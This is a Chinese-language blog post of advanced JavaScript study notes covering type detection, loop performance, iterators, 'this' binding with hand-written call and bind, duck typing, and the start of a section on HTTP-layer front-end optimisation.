<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>JavaScript高级 - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">JavaScript高级</h1>
			
		</header>
		<div class="content post__content clearfix">
			


                <div id="content_views" class="markdown_views prism-atom-one-light">
                    
                        
                    
                    <p></p>
<div class="toc">
 <h3>文章目录</h3>
 <ul>
<li><a href="#1__1">1 数据类型判断</a></li>
<li><a href="#2__114">2 三类循环性能分析</a></li>
<li>
<ul>
<li><a href="#for_vs_while_123">for循环 vs while循环</a></li>
<li><a href="#_141">数组中的循环</a></li>
<li><a href="#for_in_152">for in</a></li>
<li><a href="#for_of_162">for of</a></li>
</ul>
  </li>
<li><a href="#3_this_194">3 this分析</a></li>
<li>
<ul><li><a href="#_243">鸭子类型（狸猫换太子）</a></li></ul>
  </li>
<li><a href="#4_HTTP_259">4 HTTP网络层的前端性能优化</a></li>
<li>
<ul>
<li><a href="#url_285">url从输入到展示结果经历</a></li>
<li>
<ul>
<li><a href="#1_url_286">1. url解析</a></li>
<li><a href="#2__299">2. 缓存</a></li>
<li><a href="#3_DNS_332">3. DNS解析</a></li>
<li><a href="#4_TCP_347">4. 建立连接通道TCP三次握手</a></li>
</ul>
   </li>
<li><a href="#HTTP101120_362">HTTP1.0、1.1、2.0区别</a></li>
</ul>
  </li>
<li><a href="#5__373">5 对象深拷贝</a></li>
<li>
<ul>
<li><a href="#_377">浅拷贝</a></li>
<li><a href="#_390">深拷贝</a></li>
</ul>
  </li>
<li><a href="#6_merge_432">6 对象merge合并</a></li>
<li><a href="#7_bindcurrying_460">7 函数柯里化（bind&amp;currying）</a></li>
<li><a href="#8_AOP_486">8 AOP切面编程</a></li>
<li><a href="#9__520">9 设计模式</a></li>
<li>
<ul><li><a href="#singleton_521">单例设计模式singleton</a></li></ul>
 </li>
</ul>
</div>
<p></p> 
<h1>
<a id="1__1"></a>1 数据类型判断</h1> 
<ul>
<li>基本数据类型（5种）<br> String<br> Number<br> Boolean<br> null（常用于引用变量赋初值和垃圾回收）<br> undefined</li>
<li>对象（引用）类型（2种）<br> Object（普通对象{}，数组对象[]，正则对象/d/，Math，Date都是属于对象的）<br> Function函数<br> ES6新增：Symbol、Map</li>
</ul> 
<p>判断数据类型方法：</p> 
<ol><li>typeof：返回数据类型的字符串表达，<strong>原理是判定内存中数据类型二进制，用于除null外的基本数据类型判断（null的二进制为000，而typeof判断以000开头的类型为对象类型，所以null这种类型被判定为对象）</strong>，对于引用数据类型：除函数返回"function"，其余都返回"object"（类型是小写）</li></ol> 
<pre><code class="prism language-js"><span class="token comment">// typeof检测情况：</span>
<span class="token comment">// 基本数据类型：string boolean number undefined 正确检测</span>
<span class="token comment">// null：object</span>
<span class="token comment">// 函数：function</span>
</code></pre> 
<ol start="2"><li>instanceof：只能对象进行比较，判断的是当前对象是否是其子类实例或本身创建出来的对象，<strong>原理是：判断当前对象的原型链上是否包含该类型，包含则判定为true，否则为false。</strong> 只能比较引用对象（Function和Array的实例都是Object的子对象）</li></ol> 
<pre><code class="prism language-js"><span class="token comment">// instanceof检测情况：</span>
<span class="token comment">// 引用类型可以正确检测</span>
<span class="token comment">// 对于被手动修改了原型的的对象来说，就不一定准确了，如：函数A.prototype=Object.create(Array.prototype);A instanceof Array 为true</span>
</code></pre> 
<p>手动实现instanceof方法：</p> 
<pre><code class="prism language-js"><span class="token keyword">function</span> <span class="token function">instance_of</span><span class="token punctuation">(</span><span class="token parameter">example<span class="token punctuation">,</span>clazz</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
	<span class="token keyword">let</span> proto <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">getPrototypeOf</span><span class="token punctuation">(</span>example<span class="token punctuation">)</span>
	<span class="token keyword">let</span> cProto <span class="token operator">=</span> clazz<span class="token punctuation">.</span>prototype
	<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
		<span class="token keyword">if</span><span class="token punctuation">(</span>proto <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
			<span class="token keyword">return</span> <span class="token boolean">false</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span>proto<span class="token operator">===</span>cProto<span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
			<span class="token keyword">return</span> <span class="token boolean">true</span>
		<span class="token punctuation">}</span>
		proto <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">getPrototypeOf</span><span class="token punctuation">(</span>proto<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// 注意：考虑ie兼容性问题，使用Object.getPrototypeOf方法而不是对象.__proto__去获取实例对象的原型</span>
</code></pre> 
<ol start="3"><li>constructor<br> 可以用来判定基本数据类型，也可以判定是否是对象的细分类型，但由于该属性也可以随便改，所以也不算准确</li></ol> 
<pre><code class="prism language-js"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token number">1</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>constructor <span class="token operator">===</span> Array<span class="token punctuation">)</span> <span class="token comment">// true</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>constructor <span class="token operator">===</span> Number<span class="token punctuation">)</span> <span class="token comment">// true</span>

<span class="token class-name">Number</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> <span class="token string">"AA"</span> <span class="token comment">// 内置类的原型都随便改了，所以也不是万能的</span>
</code></pre> 
<ol start="4"><li>Object.prototype.toString.call<br> 标准的数据类型检测方法！由于Object的toString返回的是当前对象所属类型，所以可以调用Object.prototype.toString.call去改变this所属，以检测对象类型。<br> <img src="https://images2.imgbox.com/c0/e9/evQNS7vt_o.png" alt="在这里插入图片描述"><br> 但是，该方法比较麻烦，还需要对返回的结果进行处理才能拿到类型，所以一般而言，结合typeof检测基本数据类型+toString检测类数据类型比较好（instanceof和constructor可以被改变，所以不适用）</li></ol> 
<pre><code class="prism language-js"><span class="token comment">// 思路：使用typeof检测基本数据类型，除null外，使用Object.prototype.toString检测引用数据类型，将返回的奇怪格式结果封装成映射表</span>
<span class="token comment">// JQuery源码里toType全能方法</span>

<span class="token keyword">const</span> class2Type <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> toString <span class="token operator">=</span> class2Type<span class="token punctuation">.</span>toString<span class="token punctuation">;</span>
<span class="token punctuation">[</span>
  <span class="token string">"String"</span><span class="token punctuation">,</span>
  <span class="token string">"Number"</span><span class="token punctuation">,</span>
  <span class="token string">"Boolean"</span><span class="token punctuation">,</span>
  <span class="token string">"Object"</span><span class="token punctuation">,</span>
  <span class="token string">"Array"</span><span class="token punctuation">,</span>
  <span class="token string">"Function"</span><span class="token punctuation">,</span>
  <span class="token string">"Symbol"</span><span class="token punctuation">,</span>
  <span class="token string">"Date"</span><span class="token punctuation">,</span>
  <span class="token string">"RegExp"</span><span class="token punctuation">,</span>
  <span class="token string">"Error"</span>
<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">(</span>class2Type<span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">[object </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${<!-- --></span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">]</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span> <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">toType</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token comment">// null和undefined对于==来说是相等的</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">return</span> obj <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">const</span> t <span class="token operator">=</span> <span class="token keyword">typeof</span> obj<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">===</span> <span class="token string">"object"</span><span class="token punctuation">)</span> <span class="token keyword">return</span> class2Type<span class="token punctuation">[</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> t<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">toType</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">toType</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">toType</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">toType</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">toType</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">toType</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">toType</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">toType</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">toType</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">toType</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 结果如下</span>
number 
string 
boolean 
array 
object 
<span class="token keyword">null</span> 
<span class="token keyword">undefined</span> 
date 
regexp 
<span class="token keyword">function</span> 
</code></pre> 
<blockquote> 
 <p><code>===</code>：对于值判定是否是相等值，对于对象判断引用地址是否相同，特殊的：<code>null===null</code> true <code>undefined===undefined</code> true <code>null==undefined</code> true</p> 
</blockquote> 
<h1>
<a id="2__114"></a>2 三类循环性能分析</h1> 
<p>前提知识点：</p> 
<ol><li>
<code>console.time</code>和<code>console.timeEnd</code>，用于启动计时器和终止计时器，计算程序运行时间，传入的值来确定是哪个计时器</li></ol> 
<pre><code class="prism language-js">console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">...</span>
console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<h2>
<a id="for_vs_while_123"></a>for循环 vs while循环</h2> 
<pre><code class="prism language-js"><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">9999999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>lenght<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
	i<span class="token operator">++</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>结论：<code>for</code>循环速度快一倍。但是当使用<code>var</code>声明<code>i</code>变量时，两者性能相同。结合<code>for</code>适用于确定次数，而<code>while</code>适用于不定次数，使用时需要灵活选择。</p> 
<blockquote> 
 <p>测试环境在chrome浏览器中，非node环境，js循环在浏览器中调用的是浏览器的C++库<br> 可以这么理解，while中的i声明在外部，为全局变量占用空间，所以操作时比较费时间，而for是块中，当使用var时，两者都是全局所以差不多时间消耗</p> 
</blockquote> 
<h2>
<a id="_141"></a>数组中的循环</h2> 
<p><code>Array.prototype.forEach/map/reduce/filter/find/some/every</code><br> 包含多种方法</p> 
<blockquote> 
 <p>forEach(回调函数,this指向)：第二个参数为this的指向，用于调用回调函数，如果不传则默认为window</p> 
</blockquote> 
<p><code>forEach</code>：性能比for和while都差，但是优点在于函数式编程方法</p> 
<blockquote> 
 <p>函数式：what：传入需要处理什么，但只关注结果，无法控制过程，不能中途打断退出，由于会做一些和循环无关的操作，性能也会消耗<br> 命令式：how：对过程控制精细，无关代码少，性能比较高</p> 
</blockquote> 
<h2>
<a id="for_in_152"></a>for in</h2> 
<p><code>for in</code>：性能极差，速度比forEach慢很多，功能：迭代当前对象中所有可枚举的属性（私有属性大部分可枚举，公有属性部分可枚举（原型链））</p> 
<pre><code class="prism language-js"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> arr<span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>
</code></pre> 
<p>特点：</p> 
<ul>
<li>遍历顺序以数字key优先</li>
<li>无法遍历Symbol属性key（解决办法：<code>if(typeof Symbol !== "undefined") Object.keys(obj).concat(Object.getOwnPropertySymbols(obj))</code>获取到obj中所有key）</li>
<li>可以遍历到共有可枚举（解决办法：<code>if(!obj.hasOwnProperty(key)） break;</code>)</li>
</ul> 
<h2>
<a id="for_of_162"></a>for of</h2> 
<p>迭代器：代表一种规范，实现了该规范就会有属性：<code>Symbol.iterator</code><br> <code>for of</code>原理是按照迭代器规范来遍历的</p> 
<p>数组、Set、Map实现了，Object没有实现不可被迭代</p> 
<p>原理：在需要迭代的对象上获取<code>Symbol.iterator</code>属性，该属性对应一个函数，调用该函数返回一个对象，该对象包含next属性，是一个函数，每次迭代，调用next属性，返回一个对象：<code>{done:false,value:xxx}</code>如果迭代完毕返回<code>{done:true,value:undefined}</code>即可</p> 
<pre><code class="prism language-js"><span class="token comment">// 迭代器规范</span>
某个对象<span class="token punctuation">.</span><span class="token punctuation">[</span>Symbol<span class="token punctuation">.</span>iterator<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> <span class="token punctuation">{<!-- --></span>
		<span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
			<span class="token keyword">if</span><span class="token punctuation">(</span>终止条件<span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
				<span class="token keyword">return</span> <span class="token punctuation">{<!-- --></span>done<span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span>value<span class="token operator">:</span><span class="token keyword">undefined</span><span class="token punctuation">}</span>
			<span class="token punctuation">}</span>
			<span class="token comment">// ...</span>
			<span class="token keyword">return</span> <span class="token punctuation">{<!-- --></span>done<span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span>value<span class="token operator">:</span>xxx<span class="token punctuation">}</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<blockquote> 
 <p>类数组对象：{0:‘aa’,1:‘bb’,2:‘cc’,length:3}</p> 
</blockquote> 
<p><strong>如果想给 类数组 对象添加迭代器，可以不用自己写，直接使用Array的迭代器：</strong></p> 
<pre><code class="prism language-js"><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{<!-- --></span><span class="token number">0</span><span class="token operator">:</span><span class="token string">'aa'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token operator">:</span><span class="token string">'bb'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">:</span><span class="token string">'cc'</span><span class="token punctuation">,</span>length<span class="token operator">:</span><span class="token number">3</span><span class="token punctuation">}</span>
a<span class="token punctuation">[</span>Symbol<span class="token punctuation">.</span>iterator<span class="token punctuation">]</span><span class="token operator">=</span><span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">[</span>Symbol<span class="token punctuation">.</span>iterator<span class="token punctuation">]</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> v <span class="token keyword">of</span> a<span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
	console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<h1>
<a id="3_this_194"></a>3 this分析</h1> 
<p>this代表执行主体，该指向和在哪创建或执行无关，也不是执行上下文</p> 
<p>情况分五种：</p> 
<ol>
<li>函数前面有点，this就是前面的对象；函数前无点，this就是window（严格模式下是undefined）</li>
<li>事件绑定时，回调函数中的this是，被绑定元素本身</li>
<li>构造函数中的this指new出来的实例</li>
<li>箭头函数中的this绑定的是上下文中的this</li>
<li>可以基于Function.prototype.call/apply/bind去改变this指向</li>
</ol> 
<pre><code class="prism language-js"><span class="token comment">// 自己动手写一个call方法</span>
<span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">call</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> <span class="token operator">...</span>params</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">let</span> self <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">,</span>
    key <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">"KEY"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    result<span class="token punctuation">;</span>
  obj <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token punctuation">(</span>self <span class="token operator">=</span> window<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^(object|function)$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> obj<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token operator">:</span> <span class="token punctuation">(</span>obj <span class="token operator">=</span> <span class="token function">Object</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">;</span>
  result <span class="token operator">=</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">...</span>params<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">delete</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">abc</span><span class="token punctuation">(</span><span class="token parameter">p</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> name<span class="token operator">:</span> <span class="token string">"pp"</span><span class="token punctuation">,</span> age<span class="token operator">:</span> <span class="token number">11</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token function">abc</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token comment">// 自己动手写bind方法</span>
<span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">bind</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> <span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">let</span> self <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args2</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">return</span> <span class="token function">self</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> args2<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>p</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> name<span class="token operator">:</span> <span class="token string">"pp"</span><span class="token punctuation">,</span> age<span class="token operator">:</span> <span class="token number">11</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token function">a</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> 
<h2>
<a id="_243"></a>鸭子类型（狸猫换太子）</h2> 
<blockquote> 
 <p>Array.from() 可以通过以下方式来创建数组对象：<br> 伪数组对象（拥有一个 length 属性和若干索引属性的任意对象）<br> 可迭代对象（可以获取对象中的元素,如 Map和 Set 等）</p> 
</blockquote> 
<p>鸭子类型指的是：该对象大部分结构与另一个类型相同，则可以借用另一个类型已有的方法执行，如<code>arguments</code>与数组类型很相似，所以可以借用数组的很多方法，如：</p> 
<pre><code class="prism language-js"><span class="token keyword">function</span> <span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
	<span class="token comment">// use Array.prototype.slice</span>
	<span class="token keyword">let</span> args <span class="token operator">=</span> <span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span>
	<span class="token comment">// use Array.prototype.forEach</span>
	<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">,</span><span class="token parameter">x</span><span class="token operator">=&gt;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token function">func1</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span>
</code></pre> 
<h1>
<a id="4_HTTP_259"></a>4 HTTP网络层的前端性能优化</h1> 
<p>前端优化点：</p> 
<ol>
<li>HTTP网络层优化</li>
<li>代码编译层优化（webpack）</li>
<li>代码运行层优化（html css js vue react）</li>
<li>安全优化（xss csrf）</li>
<li>数据埋点及性能监控</li>
</ol> 
<p>CRP：关键路径渲染</p> 
<p>七层网络模型：</p> 
<ol>
<li>物理层：比特、电气特性</li>
<li>数据链路层：帧、MAC地址</li>
<li>网络层：报文</li>
<li>传输层：流量控制、错误检测</li>
<li>会话层</li>
<li>表示层</li>
<li>应用层</li>
</ol> 
<p>TCP/IP四层网络模型：<br> a. 网络接口层：ARP/RARP<br> b. 网络层：ICMP/IP<br> c. 传输层：TCP/UDP<br> d. 应用层：HTTP/DNS/FTP/SMTP</p> 
<h2>
<a id="url_285"></a>url从输入到展示结果经历</h2> 
<h3>
<a id="1_url_286"></a>1. url解析</h3> 
<p><img src="https://images2.imgbox.com/60/4a/VDPnS5lr_o.png" alt="在这里插入图片描述"><br> 在前后端请求时需要对一些特殊字符进行编码，如<code>:</code> <code>%</code>等，前端有两种编码方式：<br> 对整个url编码：<code>encodeURI/decodeURI</code>：这种方式只对<strong>中文</strong>和<strong>空格</strong>进行编码<br> 对参数编码：<code>encodeURIComponent/decodeURIComponent</code>：对<strong>中文</strong>、<strong>空格</strong>、<strong>%</strong>、<strong>:</strong>、<strong>/</strong> 都会编码</p> 
<blockquote> 
 <p>URI统一资源标识符<br> URL统一资源定位符<br> URN统一资源名称<br> 这是一个URL（绝对地址）：https://blog.csdn.net/qq_40321119/article/details/102856789<br> 这是一个URN（相对地址）：qq_40321119/article/details/102856789<br> 这是一个URI：可以是URL，也可以是URN</p> 
</blockquote> 
<h3>
<a id="2__299"></a>2. 缓存</h3> 
<p>属于产品优化的重点，服务端返回缓存头字段相关配置，浏览器自动实现缓存机制</p> 
<blockquote> 
